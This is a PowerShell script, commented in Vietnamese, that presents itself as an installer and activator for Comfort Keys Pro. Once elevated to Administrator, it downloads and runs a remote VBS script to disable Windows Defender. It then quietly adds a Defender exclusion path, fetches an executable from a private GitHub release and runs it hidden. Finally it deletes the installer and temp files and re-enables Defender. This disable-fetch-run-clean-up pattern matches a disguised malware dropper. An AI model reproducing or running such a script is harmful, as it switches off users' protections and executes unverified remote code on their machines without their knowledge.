<#
.SYNOPSIS
    MMT Comfort Keys Pro - Cai dat va kich huat Comfort Keys Pro
.DESCRIPTION
    Script thuc hien:
    1. Tat Windows Defender
    2. Them exclusion path (khong hien thong bao)
    3. Tai va cai dat Comfort Keys Pro
    4. Xoa file cai dat
    5. Bat lai Windows Defender
    6. Xoa file tam va thoat
#>

# Kiem tra quyen Administrator
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "Yeu cau quyen Administrator. Dang khoi dong lai voi quyen Admin..." -ForegroundColor Yellow
    Start-Sleep -Seconds 2
    Start-Process PowerShell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

Clear-Host
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "        MMT Comfort Keys Pro" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Dang thuc hien cai dat va kich hoat..." -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Cyan

# 1. Tat Windows Defender
Write-Host "1. Dang tat Windows Defender..." -ForegroundColor Yellow
$offScript = "$env:TEMP\windefend_off.vbs"
try {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ghostminhtoan/MMT/refs/heads/main/windefend%20off.vbs" -OutFile $offScript -ErrorAction Stop
    $process = Start-Process "wscript.exe" $offScript -Wait -PassThru -WindowStyle Hidden
    Remove-Item $offScript -Force -ErrorAction SilentlyContinue
    Write-Host "   Da tat Windows Defender thanh cong" -ForegroundColor Green
}
catch {
    Write-Host "   Loi khi tat Windows Defender" -ForegroundColor Red
}

# 2. Them exclusion path (hoan toan khong hien thong bao)
$exclusionPath = 'C:\Comfort Keys Pro 9.1 by MMT Windows Tech'
try {
    # Them exclusion ma khong hien bat ky thong bao nao
    $null = Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue
}
catch {
    # Khong hien thi bat ky thong bao loi nao
}

# 3. Tai va cai dat Comfort Keys Pro
Write-Host "2. Dang tai va cai dat Comfort Keys Pro..." -ForegroundColor Yellow
$installerPath = "$env:TEMP\ComfortKeys_Setup.exe"
try {
    Invoke-WebRequest -Uri "https://github.com/ghostminhtoan/private/releases/download/MMT/Comfort.Keys.Pro.9.1.by.MMT.Windows.Tech.exe" -OutFile $installerPath -ErrorAction Stop
    
    Write-Host "   Dang cai dat..." -ForegroundColor Cyan
    $process = Start-Process -FilePath $installerPath -Wait -PassThru -WindowStyle Hidden
    
    if ($process.ExitCode -eq 0) {
        Write-Host "   Cai dat thanh cong!" -ForegroundColor Green
    } else {
        Write-Host "   Cai dat that bai" -ForegroundColor Red
    }
}
catch {
    Write-Host "   Loi khi tai hoac cai dat" -ForegroundColor Red
}

# 4. Xoa file cai dat
Write-Host "3. Dang xoa file cai dat..." -ForegroundColor Yellow
try {
    if (Test-Path $installerPath) {
        Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
        Write-Host "   Da xoa file cai dat" -ForegroundColor Green
    }
}
catch {
    Write-Host "   Loi khi xoa file" -ForegroundColor Red
}

# 5. Bat lai Windows Defender
Write-Host "4. Dang bat lai Windows Defender..." -ForegroundColor Yellow
$onScript = "$env:TEMP\windefend_on.vbs"
try {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ghostminhtoan/MMT/refs/heads/main/windefend%20on.vbs" -OutFile $onScript -ErrorAction Stop
    $process = Start-Process "wscript.exe" $onScript -Wait -PassThru -WindowStyle Hidden
    Remove-Item $onScript -Force -ErrorAction SilentlyContinue
    Write-Host "   Da bat lai Windows Defender thanh cong" -ForegroundColor Green
}
catch {
    Write-Host "   Loi khi bat Windows Defender" -ForegroundColor Red
}

# 6. Hien thi ket qua cuoi cung
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "Hoan tat tat ca cac thao tac" -ForegroundColor Cyan
Write-Host "Script se tu dong dong trong 3 giay..." -ForegroundColor Yellow
Start-Sleep -Seconds 3

# Xoa cac file tam (neu con)
$tempFiles = @($offScript, $onScript, $installerPath)
foreach ($file in $tempFiles) {
    if (Test-Path $file) {
        Remove-Item $file -Force -ErrorAction SilentlyContinue
    }
}

# Thoat PowerShell
exit
